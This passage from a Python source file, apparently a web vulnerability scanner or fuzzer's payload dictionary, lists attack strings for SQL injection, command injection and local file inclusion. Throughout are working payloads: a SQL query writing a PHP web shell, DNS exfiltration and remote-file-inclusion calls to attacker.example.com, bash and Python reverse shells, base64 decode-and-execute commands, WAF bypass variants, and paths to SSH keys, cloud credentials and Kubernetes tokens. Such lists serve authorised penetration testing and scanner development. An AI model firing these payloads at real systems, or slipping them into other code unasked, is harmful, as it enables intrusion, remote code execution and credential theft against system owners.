        "%27 OR 1=1--",
        # ── MySQL file operations ──────────────────────────────────────────────
        "' UNION SELECT LOAD_FILE('/etc/passwd'),2--",
        "' INTO OUTFILE '/var/www/html/sh.php' LINES TERMINATED BY '<?php system($_GET[c]); ?>'--",
        # ── OOB DNS exfil ──────────────────────────────────────────────────────
        "' AND LOAD_FILE(CONCAT('\\\\\\\\',@@version,'.attacker.example.com\\\\a'))--",
        # ── Realistic value-prefixed variants (boolean-string) ─────────────────
        # These mimic actual user input in a string column: user' AND cond--
        "test' AND 1=1--",
        "test' AND 1=2--",
        "test' OR 1=1--",
        "test' OR 1=2--",
        "admin' OR '1'='1",
        "admin' OR '1'='2",
        "test' AND 'a'='a",
        "test' AND 'a'='b",
        "a' OR 'x'='x",
        "a' OR 'x'='y",
        "(test)' OR 1=1--",
        "(test)' AND 1=1--",
        "x' OR 1=1 OR 'x'='y",
        "foo' OR 1=1 LIMIT 1--",
        "bar' OR 1=1 LIMIT 1 OFFSET 0--",
        "test') OR ('1'='1",
        "test')) OR (('1'='1",
        "1' AND '1'='1' AND SLEEP(0)--",
        # ── Realistic value-prefixed variants (boolean-numeric) ────────────────
        "1 AND 1=1--",
        "1 AND 1=2--",
        "0 OR 1=1--",
        "2 OR 1=1--",
        "1 AND TRUE--",
        "1 AND FALSE--",
        "1) AND (1=1",
        "1)) OR ((1=1",
        "1 AND 1=1 LIMIT 1--",
        "1 OR 2>1--",
        "-1 OR 2>1--",
        "0 UNION SELECT NULL--",
        # ── Realistic value-prefixed variants (error-based) ────────────────────
        "test' AND EXTRACTVALUE(1,CONCAT(0x7e,@@version))--",
        "test' AND UPDATEXML(1,CONCAT(0x7e,(SELECT version()),0x7e),1)--",
        "test' AND EXP(~(SELECT * FROM (SELECT version())x))--",
        "test' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT @@version),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
        "test' AND GTID_SUBSET(CONCAT(0x7e,(SELECT @@version),0x7e),1)--",
        "1' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT group_concat(schema_name) FROM information_schema.schemata),0x7e))--",
        "test' AND 1=CAST((SELECT version()) AS NUMERIC)--",
        "test' AND 1=CONVERT(INT,@@version)--",
        "test' AND 1=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||(SELECT banner FROM v$version WHERE ROWNUM=1)||CHR(62))) FROM DUAL)--",
        # ── Realistic value-prefixed variants (time-based) ────────────────────
        "test' AND SLEEP(5)--",
        "test' OR SLEEP(5)--",
        "test' AND SLEEP(5) AND 'x'='x",
        "1 AND IF(1=1,SLEEP(5),0)--",
        "1 AND IF(ASCII(SUBSTRING(database(),1,1))>90,SLEEP(5),0)--",
        "test' AND BENCHMARK(5000000,MD5('test'))--",
        "test'; WAITFOR DELAY '0:0:5'--",
        "test' AND (SELECT 1 FROM PG_SLEEP(5))=1--",
        "test' AND DBMS_PIPE.RECEIVE_MESSAGE('RDS',5)=1--",
        # ── Realistic value-prefixed variants (union-based) ────────────────────
        "test' UNION SELECT NULL--",
        "test' UNION SELECT NULL,NULL--",
        "test' UNION SELECT NULL,NULL,NULL--",
        "-1' UNION SELECT 1,2,3--",
        "-1' UNION ALL SELECT NULL,NULL,NULL--",
        "test' UNION SELECT @@version,NULL--",
        "test' UNION SELECT user(),database()--",
        "-1 UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database()--",
        "test' UNION SELECT 1,CONCAT(0x7e,@@version,0x7e),3--",
        "0' UNION SELECT username,password,3 FROM users--",
        # ── Realistic value-prefixed variants (stacked) ────────────────────────
        "test'; SELECT 1--",
        "test'; INSERT INTO users VALUES(1,'hacked','hacked')--",
        "test'; DROP TABLE users--",
        "1; EXEC xp_cmdshell('whoami')--",
        "test'; EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE--",
        # ── Whitespace bypass (tab/LF/CR/VT/FF/NBSP as space) ─────────────────
        "%09AND%091=1%09--",
        "%0AAND%0A1=1%0A--",
        "%0DAND%0D1=1%0D--",
        "%0CAND%0C1=1%0C--",
        "%0BAND%0B1=1%0B--",
        "%A0AND%A01=1%A0--",
        "%09OR%091=1%09--",
        "%0AOR%0A1=1%0A--",
        "1/*comment*/AND/**/1=1/**/--",
        "1/**/aND/**/1=1/**/--",
        "-1/**/oR/**/1=1--",
        # ── RLIKE-based detection ─────────────────────────────────────────────
        "1 RLIKE (SELECT (CASE WHEN (4346=4346) THEN 0x61646d696e ELSE 0x28 END))",
        "1 RLIKE (SELECT (CASE WHEN (4346=4347) THEN 0x61646d696e ELSE 0x28 END))",
        "' RLIKE SLEEP(3)-- -",
        # ── Mixed case + parentheses (no spaces) ──────────────────────────────
        "(1)oR(1=1)--",
        "(1)aND(1=1)--",
        "'oR(2)LiKE(2)-- -",
        "'oR true-- -",
        "'||true-- -",
        "'||2=2-- -",
        "'||'2'LiKE'2'-- -",
        # ── GBK / Unicode prefix injection ────────────────────────────────────
        "%bf' OR 1=1-- -",
        "%A8%27 OR 1=1-- -",
        "%8C%A8%27 OR 1=1-- -",
        # ── Backtick termination (MySQL) ───────────────────────────────────────
        "' UNION SELECT 1,2,3`",
        "' UnION SELeCT 1,2,3`",
        # ── UNION with no spaces (parentheses) ────────────────────────────────
        "'UniON(SElecT(1),2,3)-- -",
        "'UniON(SElecT(1),NULL,NULL)-- -",
        "\"UniON(SElecT(1),2,3)-- -",
        # ── Boolean conditional ────────────────────────────────────────────────
        "' OR IF(1=1,1,0)-- -",
        "' AND IF(1=1,SLEEP(0),SLEEP(3))-- -",
        "' AND CASE WHEN (1=1) THEN 1 ELSE 0 END-- -",
        # ── Version substring fingerprinting (adds to detection evidence) ─────
        "' AND (SELECT SUBSTRING(@@version,1,1))='5'-- -",
        "' AND (SELECT SUBSTRING(@@version,1,1))='8'-- -",
        "' AND (SELECT SUBSTRING(version(),1,1))='P'-- -",
        # ── Integer arithmetic tautologies ────────────────────────────────────
        "1+1-2 AND 1=1--",
        "2*1-1 AND 1=1--",
        "0x41=0x41 AND 1=1--",
        # ── Auth bypass combos ────────────────────────────────────────────────
        "admin'--",
        "admin' #",
        "admin'/*",
        "' or username like '%",
        "' or uid like '%",
        "ffifdyop",
        # ── JSON-inline technique (Claroty Team82) ────────────────────────────
        "' OR JSON_LENGTH('{}')<=8896-- -",
        "' OR JSON_VALID('1')-- -",
        "' UNION distinctrow SELECT NULL,NULL,NULL-- -",
        "' UNION distinctrow SELECT @@version,NULL,NULL-- -",
        "' OR JSON_EXTRACT('{\"a\":1}','$.a')=1-- -",
        # ── OOB / DNS exfil (passive; needs Collaborator/interactsh) ─────────
        "' AND LOAD_FILE(CONCAT(0x5c5c5c5c,@@version,0x2e,0x6578616d706c65,0x2e636f6d,0x5c5c612))--",
        "'; EXEC master..xp_dirtree '//'+@@version+'.x.example.com/a'-- -",
    ],

    "Command Injection": [
        # ── Unix semicolons ───────────────────────────────────────────────────
        "; id",
        "; id #",
        "; id //",
        "; whoami",
        "; cat /etc/passwd",
        "; uname -a",
        "; ls -la /",
        "; ls -la /etc/",
        "; env",
        "; printenv",
        "; hostname",
        "; ifconfig",
        "; ip a",
        # ── Unix pipes ────────────────────────────────────────────────────────
        "| id",
        "|| id",
        "| whoami",
        "| cat /etc/passwd",
        "| uname -a",
        "|id",
        "||id",
        "|whoami",
        # ── Ampersand ─────────────────────────────────────────────────────────
        "& id",
        "&& id",
        "& whoami",
        "&id",
        "&&id",
        # ── Newline / CRLF injection ──────────────────────────────────────────
        "\n id",
        "\r\n id",
        "%0aid",
        "%0a id",
        "%0a%0d id",
        "%0did",
        # ── Subshell / backtick ───────────────────────────────────────────────
        "`id`",
        "$(id)",
        "`whoami`",
        "$(whoami)",
        "`cat /etc/passwd`",
        "$(cat /etc/passwd)",
        "`uname -a`",
        "$(uname${IFS}-a)",
        # ── IFS bypass (WAF space evasion, from commix patterns) ─────────────
        "${IFS}id",
        ";${IFS}id",
        "|${IFS}id",
        "${IFS}cat${IFS}/etc/passwd",
        "$IFS$9id",
        "$IFS$9cat$IFS$9/etc/passwd",
        "{id}",
        "id",
        # ── Brace expansion ───────────────────────────────────────────────────
        "{ls,-la}",
        "{cat,/etc/passwd}",
        "{id}",
        # ── Argument splitting bypass ─────────────────────────────────────────
        "ca$@t /etc/passwd",
        "c'a't /etc/passwd",
        "c\"a\"t /etc/passwd",
        "/bin/c'at' /etc/passwd",
        "/???/??t /etc/passwd",
        "/???/c?t /etc/passwd",
        # ── Glob / wildcard bypass ────────────────────────────────────────────
        "/bin/cat /etc/pass*",
        "/bin/cat /etc/p?sswd",
        "l''s",
        # ── Python / interpreter injection ────────────────────────────────────
        "; python -c \"import os; os.system('id')\"",
        "; python3 -c \"import os; os.system('id')\"",
        "; perl -e 'system(\"id\")'",
        "; ruby -e 'exec(\"id\")'",
        "; php -r 'system(\"id\");'",
        "; node -e 'require(\"child_process\").exec(\"id\",function(e,s,r){process.stdout.write(s)})'",
        # ── Base64 encoded command bypass ─────────────────────────────────────
        "; echo aWQ= | base64 -d | bash",
        "; bash -c \"{echo,aWQ=}|{base64,-d}|bash\"",
        "; echo d2hvYW1p | base64 -d | sh",
        "$(echo aWQ= | base64 -d)",
        # ── Hex encoded ───────────────────────────────────────────────────────
        "; $(printf '\\x69\\x64')",
        "; $(printf '\\x77\\x68\\x6f\\x61\\x6d\\x69')",
        # ── Encoded separators ────────────────────────────────────────────────
        "1%3Bid",
        "1%0Aid",
        "1%0A%0Did",
        "1%26id",
        "1%7Cid",
        "1%7C%7Cid",
        # ── Context escapes ───────────────────────────────────────────────────
        "\"; id #",
        "'; id #",
        "\"; whoami #",
        "'; whoami #",
        "1`id`",
        "1$(id)",
        "a;id;a",
        "a|id|a",
        "a;a;id",
        "a|a|id",
        # ── Windows specifics ─────────────────────────────────────────────────
        "& whoami",
        "| whoami",
        "&& whoami",
        "& dir",
        "| dir",
        "& ipconfig",
        "& type C:\\Windows\\System32\\drivers\\etc\\hosts",
        "& net user",
        "& net localgroup administrators",
        "& systeminfo",
        "& wmic os get caption",
        "| dir C:\\",
        # ── Windows PowerShell ────────────────────────────────────────────────
        "& powershell -c whoami",
        "& powershell -c Get-Process",
        "| powershell -nop -c whoami",
        # ── Network callback ──────────────────────────────────────────────────
        "; ping -c 3 127.0.0.1",
        "; ping -n 3 127.0.0.1",
        "; curl http://127.0.0.1:1337/",
        "; curl http://127.0.0.1:1337/$(id)",
        "$(curl http://127.0.0.1:1337/$(id))",
        "; wget -q http://127.0.0.1:1337/$(id)",
        "; nslookup attacker.example.com",
        "; curl http://attacker.example.com/`id`",
        # ── Reverse shell stubs ───────────────────────────────────────────────
        "; bash -i >& /dev/tcp/127.0.0.1/4444 0>&1",
        "; sh -i >& /dev/tcp/127.0.0.1/4444 0>&1",
        "; python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"127.0.0.1\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/sh\")'",
        # ── Awesome-WAF: Cloudflare RCE bypass ────────────────────────────────
        "cat$u+/etc$u/passwd$u",
        "cat$u /etc$u/passwd$u",
        ";cat$u+/etc$u/passwd$u",
        # ── Awesome-WAF: ModSecurity bypass (uninitialized vars) ──────────────
        ";+$u+cat+/etc$u/passwd$u",
        ";+$u+cat+/etc$u/passwd+\\#",
        "$u**/bin**$u**/cat**$u $u**/etc**$u**/passwd**$u",
        # ── Awesome-WAF: ModSecurity wildcard / glob ───────────────────────────
        "/???/??t+/???/??ss??",
        "/?in/cat+/et?/passw?",
        "/???/c?t /etc/p?sswd",
        "/bin/c?t /etc/pa?swd",
        # ── Single-quote splitting (bash string) ──────────────────────────────
        "/bi'n'''/c''at' /e'tc'/pa''ss'wd",
        "c'at' /etc/passwd",
        "ca''t /etc/passwd",
        # ── Dollar-string in path ──────────────────────────────────────────────
        "/bin/cat /etc/passwd$u",
        "id$u",
        "whoami$u",
        # ── Null separator ─────────────────────────────────────────────────────
        "id%00",
        "; id%00",
        "| id%00",
        # ── Wave-3: Octal / hex path encoding ────────────────────────────────
        "; cat $'\\x2fetc\\x2fpasswd'",
        "; $(printf '\\x63\\x61\\x74') /etc/passwd",
        "; $(printf '\\x63\\x61\\x74') $'\\x2fetc\\x2fpasswd'",
        # ── Wave-3: Brace expansion ───────────────────────────────────────────
        "; {cat,/etc/passwd}",
        "; {ca,t,/etc/passwd}",
        # ── Wave-3: Env-var path construction ────────────────────────────────
        "; X=/et;Y=c/pa;Z=sswd;cat $X$Y$Z",
        "; cat ${HOME}/../etc/passwd",
        # ── Wave-3: Globbing patterns ─────────────────────────────────────────
        "; /???/c?t /???/p?ss??",
        "; /b??/c?t /e??/p???wd",
        # ── Wave-3: Shell builtin (no external binary) ────────────────────────
        "; while IFS= read -r l; do echo $l; done </etc/passwd",
        # ── Wave-3: Newline injections ─────────────────────────────────────────
        "%0a cat /etc/passwd %0a",
        "%0d%0a cat /etc/passwd %0d%0a",
        "\\ncat /etc/passwd\\n",
        # ── Wave-3: Interpreter-based execution ───────────────────────────────
        "; python3 -c '__import__(\"os\").system(\"id\")'",
        "; python3 -c \"exec(chr(111)+chr(115)+chr(46)+chr(115)+chr(121)+chr(115)+chr(116)+chr(101)+chr(109)+chr(40)+chr(39)+chr(105)+chr(100)+chr(39)+chr(41))\"",
        "; perl -e 'system(\"id\")'",
        "; ruby -e 'system(\"id\")'",
        "; php -r 'system(\"id\");'",
        # ── Wave-3: Base64 decode + exec ──────────────────────────────────────
        "; $(echo 'cat /etc/passwd' | base64 -d | sh)",
        "; bash -c $(printf '%s' 'cat /etc/passwd')",
        # ── Wave-3: IFS / tab field splitting ─────────────────────────────────
        ";${IFS}cat${IFS}/etc/passwd",
        "|\tcat\t/etc/passwd",
        # ── Interpreter-based (no /bin path required) ─────────────────────────
        "; python3 -c 'import os;print(os.popen(\"id\").read())'",
        "; python3 -c '__import__(\"os\").system(\"id\")'",
        "; perl -e 'system(\"id\")'",
        "; ruby -e 'exec(\"id\")'",
        "; node -e 'require(\"child_process\").exec(\"id\",(_,s)=>process.stdout.write(s))'",
        "; php -r 'system(\"id\");'",
        # ── PowerShell ────────────────────────────────────────────────────────
        "; powershell -c whoami",
        "; powershell -enc aQBkAA==",
        "; powershell -nop -exec bypass -c \"whoami\"",
        "& { whoami }",
        "$(whoami)",
        # ── Quote-splitting path obfuscation ──────────────────────────────────
        "; c'a't /etc/passwd",
        "; c\"a\"t /etc/passwd",
        "; /b'i'n/cat /etc/passwd",
        # ── Brace expansion ────────────────────────────────────────────────────
        "; {cat,/etc/passwd}",
        "; {ca,t${IFS}/etc/passwd}",
        # ── Env-var path construction ──────────────────────────────────────────
        "; X=/et;Y=c/passwd;cat ${X}${Y}",
        "; X=/et;Y=/passwd;cat ${X}c${Y}",
        "${HOME%/*}/bin/cat /etc/passwd",
        # ── Globbing ──────────────────────────────────────────────────────────
        "; /???/c?t /???/p?ss??",
        "; /b??/c?t /e??/p???wd",
        "; /bin/c[a]t /etc/pa[s]swd",
        # ── Shell builtins (no external binary) ───────────────────────────────
        "; while IFS= read -r l; do echo \"$l\"; done </etc/passwd",
        "; mapfile -t a </etc/passwd;printf '%s\\n' \"${a[@]}\"",
        # ── Base64 decode-exec ────────────────────────────────────────────────
        "; $(echo 'aWQ=' | base64 -d | sh)",
        "; bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dk)",
        # ── IFS manipulation ──────────────────────────────────────────────────
        "; IFS=_;cmd=cat_/etc/passwd;$cmd",
        "; IFS='\\t' eval 'cat\\t/etc/passwd'",
        # ── Newline injection ─────────────────────────────────────────────────
        "%0a id %0a",
        "%0d%0a id %0d%0a",
        "\\ncat /etc/passwd\\n",
        "; %0a cat /etc/passwd",
        # ── Hex/octal path encoding ────────────────────────────────────────────
        "; $(printf '\\x63\\x61\\x74') /etc/passwd",
        "; $(printf '\\x63\\x61\\x74') \\x2fetc\\x2fpasswd",
        "; cat $'\\x2fetc\\x2fpasswd'",
        # ── Semicolon/newline stacking ─────────────────────────────────────────
        "; id; uname -a; whoami",
        "| id | uname -a",
        "& id & whoami",
        "&& id && whoami",
        "|| id || whoami",
    ],

    "LFI": [
        # ── Standard unix traversal at increasing depth ───────────────────────
        "../../etc/passwd",
        "../../../etc/passwd",
        "../../../../etc/passwd",
        "../../../../../etc/passwd",
        "../../../../../../etc/passwd",
        "../../../../../../../etc/passwd",
        "../../../../../../../../etc/passwd",
        "../../../../../../../../../etc/passwd",
        "../../../../../../../../../../etc/passwd",
        # ── Null byte (old PHP <5.3.4) ────────────────────────────────────────
        "../../../etc/passwd%00",
        "../../../../etc/passwd%00",
        "../../../etc/passwd%00.jpg",
        "../../../etc/passwd%00.php",
        "../../../etc/passwd\x00",
        # ── URL-encoded slash (LFI-Chef: /→%2f) ──────────────────────────────
        "..%2F..%2F..%2Fetc%2Fpasswd",
        "..%2F..%2F..%2F..%2Fetc%2Fpasswd",
        "..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        # ── Double URL encoding (LFI-Chef: /→%252f) ───────────────────────────
        "..%252F..%252F..%252Fetc%252Fpasswd",
        "..%252F..%252F..%252F..%252Fetc%252Fpasswd",
        "%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd",
        # ── 16-bit Unicode encoding (LFI-Chef: /→%u002f, /→%u2215) ───────────
        "..%u002f..%u002f..%u002fetc%u002fpasswd",
        "..%u2215..%u2215..%u2215etc%u2215passwd",
        "..%u002f..%u002f..%u002f..%u002fetc%u002fpasswd",
        # ── Overlong UTF-8 (LFI-Chef: /→%c0%af, /→%e0%80%af, /→%c0%2f) ──────
        "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
        "..%e0%80%af..%e0%80%af..%e0%80%afetc%e0%80%afpasswd",
        "..%c0%2f..%c0%2f..%c0%2fetc%c0%2fpasswd",
        "..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc%ef%bc%8fpasswd",
        # ── Dot encoding (LFI-Chef: .→%2e) ───────────────────────────────────
        "%2e%2e/%2e%2e/%2e%2e/etc/passwd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        # ── Mixed traversal variations ────────────────────────────────────────
        "....//....//....//etc/passwd",
        "....////....////....////etc/passwd",
        "..///////..////..//////etc/passwd",
        ".././.././.././etc/passwd",
        "..;/..;/..;/etc/passwd",
        "..%2f..%2f..%2f..%2fetc/passwd",
        "/%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd",
        # ── Backslash mixed (Windows-style on Linux servers) ──────────────────
        "..\\..\\..\\etc\\passwd",
        "..%5C..%5C..%5Cetc%5Cpasswd",
        # ── Absolute paths: core unix ─────────────────────────────────────────
        "/etc/passwd",
        "/etc/shadow",
        "/etc/group",
        "/etc/hosts",
        "/etc/hostname",
        "/etc/issue",
        "/etc/issue.net",
        "/etc/os-release",
        "/etc/debian_version",
        "/etc/redhat-release",
        "/etc/centos-release",
        "/etc/lsb-release",
        "/etc/fstab",
        "/etc/mtab",
        "/etc/crontab",
        "/etc/cron.d/",
        "/etc/cron.daily/",
        "/etc/environment",
        "/etc/profile",
        "/etc/bashrc",
        "/etc/timezone",
        "/etc/localtime",
        "/etc/resolv.conf",
        "/etc/nsswitch.conf",
        "/etc/motd",
        # ── SSH keys ──────────────────────────────────────────────────────────
        "/root/.ssh/id_rsa",
        "/root/.ssh/id_rsa.pub",
        "/root/.ssh/authorized_keys",
        "/root/.ssh/known_hosts",
        "/home/user/.ssh/id_rsa",
        "/.ssh/id_rsa",
        # ── /proc virtual filesystem ──────────────────────────────────────────
        "/proc/version",
        "/proc/self/environ",
        "/proc/self/cmdline",
        "/proc/self/status",
        "/proc/self/maps",
        "/proc/self/fd/0",
        "/proc/self/fd/1",
        "/proc/self/fd/2",
        "/proc/net/fib_trie",
        "/proc/net/tcp",
        "/proc/sched_debug",
        "/proc/1/cmdline",
        "/proc/1/environ",
        # ── Web server logs (log poisoning candidates) ────────────────────────
        "/var/log/apache/access.log",
        "/var/log/apache/error.log",
        "/var/log/apache2/access.log",
        "/var/log/apache2/error.log",
        "/var/log/nginx/access.log",
        "/var/log/nginx/error.log",
        "/var/log/httpd/access_log",
        "/var/log/httpd/error_log",
        "/usr/local/apache/log/access_log",
        "/usr/local/apache2/log/access_log",
        # ── Auth / syslog for log poisoning ───────────────────────────────────
        "/var/log/auth.log",
        "/var/log/syslog",
        "/var/log/messages",
        "/var/log/secure",
        "/var/log/mail.log",
        "/var/log/vsftpd.log",
        "/var/log/proftpd/proftpd.log",
        "/var/log/pure-ftpd/pure-ftpd.log",
        # ── App config / secrets ──────────────────────────────────────────────
        "/var/www/html/index.php",
        "/var/www/html/config.php",
        "/var/www/html/wp-config.php",
        "/var/www/html/.env",
        "/var/www/.env",
        "/.env",
        "/app/.env",
        "/config/database.yml",
        "/config/secrets.yml",
        "/config/application.yml",
        "/../../../.env",
        # ── Session files ─────────────────────────────────────────────────────
        "/var/lib/php/sessions/sess_",
        "/tmp/sess_",
        "/tmp/session_",
        # ── PHP wrappers: filter base64 ───────────────────────────────────────
        "php://filter/convert.base64-encode/resource=index.php",
        "php://filter/read=convert.base64-encode/resource=index.php",
        "php://filter/convert.base64-encode/resource=config.php",
        "php://filter/convert.base64-encode/resource=../config.php",
        "php://filter/convert.base64-encode/resource=../../config.php",
        "php://filter/convert.base64-encode/resource=/etc/passwd",
        # ── PHP wrappers: iconv chain ─────────────────────────────────────────
        "php://filter/convert.iconv.UTF-8.UTF-16/resource=index.php",
        "php://filter/convert.iconv.UTF-8.UNICODE/resource=index.php",
        "php://filter/string.rot13/resource=index.php",
        "php://filter/zlib.inflate/convert.base64-encode/resource=index.php",
        # ── PHP wrappers: other ───────────────────────────────────────────────
        "php://input",
        "php://stdin",
        "php://memory",
        # ── Data wrapper (RCE if allow_url_include=On) ────────────────────────
        "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+",
        "data://text/plain,<?php system($_GET['cmd']); ?>",
        # ── Expect / phar wrappers ────────────────────────────────────────────
        "expect://id",
        "expect://whoami",
        "phar://./uploads/shell.jpg",
        "zip://./uploads/shell.zip%23shell.php",
        # ── RFI (if allow_url_include=On) ─────────────────────────────────────
        "http://attacker.example.com/shell.txt",
        "http://attacker.example.com/shell.txt%00",
        "\\\\attacker.example.com\\share\\shell.php",
        # ── Windows absolute paths ────────────────────────────────────────────
        "C:\\Windows\\System32\\drivers\\etc\\hosts",
        "C:/Windows/System32/drivers/etc/hosts",
        "C:\\Windows\\win.ini",
        "C:/Windows/win.ini",
        "C:\\boot.ini",
        "C:/boot.ini",
        "C:\\inetpub\\wwwroot\\web.config",
        "C:/inetpub/wwwroot/web.config",
        "C:\\Windows\\System32\\config\\SAM",
        "C:\\Windows\\repair\\SAM",
        "C:\\Windows\\System32\\config\\SYSTEM",
        "C:\\Windows\\System32\\config\\SECURITY",
        "C:\\Windows\\System32\\inetsrv\\config\\applicationHost.config",
        # ── Windows traversal ─────────────────────────────────────────────────
        "..\\..\\..\\Windows\\System32\\drivers\\etc\\hosts",
        "..\\..\\..\\Windows\\win.ini",
        "..%5C..%5C..%5CWindows%5Cwin.ini",
        "..%5C..%5C..%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Chosts",
        "..%255C..%255C..%255CWindows%255Cwin.ini",
        # ── Windows 16-bit unicode slash ──────────────────────────────────────
        "..%u005c..%u005c..%u005cWindows%u005cwin.ini",
        "..%u2216..%u2216..%u2216Windows%u2216win.ini",
        "../../windows/win.ini",
        # ── PHP filter chains ─────────────────────────────────────────────────
        # iconv chain — converts encoding through multiple stages so WAF
        # signature matching fails; PHP still resolves to target resource
        "php://filter/convert.iconv.UTF-8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF-8.UTF7|convert.iconv.UTF-8.UTF16LE|convert.iconv.UTF-8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF-8.UTF7/resource=index.php",
        "php://filter/convert.iconv.UTF-8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF-8.UTF7|convert.iconv.UTF-8.UTF16LE|convert.iconv.UTF-8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF-8.UTF7/resource=../../../../../etc/passwd",
        "php://filter/convert.iconv.UTF-8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF-8.UTF7|convert.iconv.UTF-8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF-8.UTF7/resource=config.php",
        # glob:// — enumerate files without direct include
        "glob://./var/www/html/*.php",
        "glob:///var/www/*",
        # ── Container / cloud secrets ──────────────────────────────────────────
        "/run/secrets/kubernetes.io/serviceaccount/token",
        "/run/secrets/kubernetes.io/serviceaccount/ca.crt",
        "/run/secrets/kubernetes.io/serviceaccount/namespace",
        "/var/run/secrets/kubernetes.io/serviceaccount/token",
        "/etc/kubernetes/admin.conf",
        "/etc/kubernetes/pki/ca.crt",
        "/.docker/config.json",
        "/root/.docker/config.json",
        "/home/ubuntu/.docker/config.json",
        "/home/ubuntu/.aws/credentials",
        "/root/.aws/credentials",
        "/root/.aws/config",
        "/.aws/credentials",
        # ── Additional /proc paths ─────────────────────────────────────────────
        "/proc/self/cwd",
        "/proc/self/root",
        "/proc/self/exe",
        "/proc/self/loginuid",
        "/proc/net/arp",
        "/proc/sys/kernel/hostname",
        "/proc/sys/kernel/osrelease",
        "/proc/sys/net/ipv4/conf/all/forwarding",
        "/proc/1/net/fib_trie",
        "/proc/1/net/tcp6",
        # ── Shell history & private keys ───────────────────────────────────────
        "/root/.bash_history",
        "/root/.sh_history",
        "/home/www-data/.bash_history",
        "/var/spool/cron/crontabs/root",
        "/etc/ssl/private/server.key",
        "/etc/ssl/private/ssl.key",
        "/etc/apache2/ssl/server.key",
        "/etc/nginx/ssl/server.key",
        "~/.ssh/id_rsa",
        # ── Framework / CMS config ────────────────────────────────────────────
        # Laravel
        "storage/logs/laravel.log",
        "../../storage/logs/laravel.log",
        "../../../storage/logs/laravel.log",
        "bootstrap/cache/config.php",
        # Symfony
        "var/log/prod.log",
        "var/log/dev.log",
        "app/config/parameters.yml",
        "app/config/config.yml",
        # Django
        "settings.py",
        "../settings.py",
        "../../settings.py",
        "config/settings.py",
        # Ruby on Rails
        "config/database.yml",
        "config/secrets.yml",
        "config/credentials.yml.enc",
        "db/schema.rb",
        # Node.js
        "package.json",
        ".npmrc",
        "config/default.json",
        "config/production.json",
        # Tomcat / Java
        "../../../../../../../opt/tomcat/conf/tomcat-users.xml",
        "../../../../tomcat/conf/tomcat-users.xml",
        "/opt/tomcat/conf/tomcat-users.xml",
        "/etc/tomcat8/tomcat-users.xml",
        "/etc/tomcat9/tomcat-users.xml",
        # WordPress
        "../../../wp-config.php",
        "../../../../wp-config.php",
        "../../wp-config.php",
        "/var/www/html/wp-config.php",
        # Drupal / Joomla
        "sites/default/settings.php",
        "../../sites/default/settings.php",
        "configuration.php",
        # ── IIS / Windows extended ────────────────────────────────────────────
        "C:\\inetpub\\logs\\LogFiles\\W3SVC1\\u_ex*.log",
        "C:/inetpub/logs/LogFiles/W3SVC1/",
        "C:\\Windows\\System32\\config\\AppEvent.evt",
        "C:\\Windows\\System32\\winevt\\Logs\\Application.evtx",
        "C:\\Windows\\Panther\\Unattend\\Unattended.xml",
        "C:\\Windows\\Panther\\Unattend.xml",
        "C:\\sysprep\\sysprep.xml",
        "C:\\sysprep\\sysprep.inf",
        "C:\\WINDOWS\\php.ini",
        "C:\\php\\php.ini",
        # ── Nginx config ─────────────────────────────────────────────────────
        "/etc/nginx/nginx.conf",
        "/etc/nginx/conf.d/default.conf",
        "/etc/nginx/sites-enabled/default",
        "/etc/nginx/sites-available/default",
        "/usr/local/nginx/conf/nginx.conf",
        # ── Apache extended ───────────────────────────────────────────────────
        "/etc/apache2/apache2.conf",
        "/etc/apache2/ports.conf",
        "/etc/apache2/sites-enabled/000-default.conf",
        "/etc/httpd/conf/httpd.conf",
        "/usr/local/apache2/conf/httpd.conf",
        # ── PHP config ────────────────────────────────────────────────────────
        "/etc/php/7.4/apache2/php.ini",
        "/etc/php/8.0/apache2/php.ini",
        "/etc/php/8.1/apache2/php.ini",
        "/etc/php/8.2/cli/php.ini",
        "/usr/local/lib/php.ini",
        "/etc/php.ini",
        # ── Advanced phar / zip wrappers ──────────────────────────────────────
        "phar:///var/www/html/uploads/file.phar",
        "phar://./uploads/archive.tar/payload.php",
        "zip:///var/www/html/uploads/archive.zip#payload.php",
        "compress.zlib://php://filter/convert.base64-encode/resource=/etc/passwd",
        # ── Log poisoning candidates (extended) ───────────────────────────────
        "/var/log/apache2/access.log",
        "/var/log/nginx/access.log",
        "/proc/self/fd/10",
        "/proc/self/fd/11",
        "/proc/self/fd/12",
        "/var/log/mail/error",
        "/var/log/php_errors.log",
        "/var/log/php7.4-fpm.log",
        "/var/log/php8.0-fpm.log",
        "/var/log/php-fpm/error.log",
        "/usr/local/apache/logs/access.log",
        "/usr/local/apache/logs/error.log",
        "/var/log/lighttpd/access.log",
        "/var/log/lighttpd/error.log",
        # ── LO's files: PHP wrappers (wrapper-PHP.txt) ────────────────────────
        "php://filter/convert.base64-encode/resource=index.php",
        "pHp://FilTer/convert.base64-encode/resource=index.php",
        "php://filter/read=string.rot13/resource=index.php",
        "php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd",
